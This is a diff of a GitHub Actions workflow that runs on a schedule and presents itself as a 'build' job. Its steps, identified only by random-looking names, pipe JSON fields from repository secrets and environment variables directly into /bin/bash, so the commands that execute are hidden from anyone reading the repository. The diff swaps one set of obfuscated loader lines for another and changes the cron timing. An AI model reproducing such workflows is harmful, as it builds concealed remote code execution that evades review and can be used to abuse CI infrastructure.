@@ -3,28 +3,26 @@ name: mizhengxuan1736
 on:
   workflow_dispatch:
   schedule:
-    - cron: '56 1/6 * * *'
+    - cron: '29 4/6 * * *'
 
-jobs:  # 11639
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: mizhengxuan1736
         env:
-          th9053: ${{ secrets.th9053 }}
+          tr12: ${{ secrets.tr12 }}
         run: |
-          echo $th9053 | jq -r .kwj9 | /bin/bash
-          echo $tch92307 | jq -r .foymz0288 | /bin/bash
-          echo $jptrz1 | jq -r .avx656 | /bin/bash
-          echo $qqvaa22 | jq -r .jxnxk9850 | /bin/bash
-          echo $odoc5 | jq -r .cikpk6 | /bin/bash
-          echo $mkan1 | jq -r .ifrzu780 | /bin/bash
-          echo $zurhl695 | jq -r .ihum7652 | /bin/bash
-          echo $v15 | jq -r .i747 | /bin/bash
-          echo $yntvt94 | jq -r .d15869 | /bin/bash
-          echo $pi99642 | jq -r .gyn946 | /bin/bash
-          echo $zp6266 | jq -r .hrq16 | /bin/bash
-          echo $oqz20 | jq -r .n6 | /bin/bash
+          echo $tr12 | jq -r .epl3685 | /bin/bash
+          echo $oes76729 | jq -r .v1 | /bin/bash
+          echo $sgkag4 | jq -r .dldv77 | /bin/bash
+          echo $obfmg73457 | jq -r .ae31 | /bin/bash
+          echo $but96 | jq -r .mx682 | /bin/bash
+          echo $spc86 | jq -r .r66445 | /bin/bash
+          echo $ropa81007 | jq -r .tp0 | /bin/bash
+          echo $nwh164 | jq -r .fqad8889 | /bin/bash
+          echo $uvvzf513 | jq -r .trezr16 | /bin/bash
+          echo $j4072 | jq -r .ng03 | /bin/bash
+          echo $vwyyf173 | jq -r .los6445 | /bin/bash
 
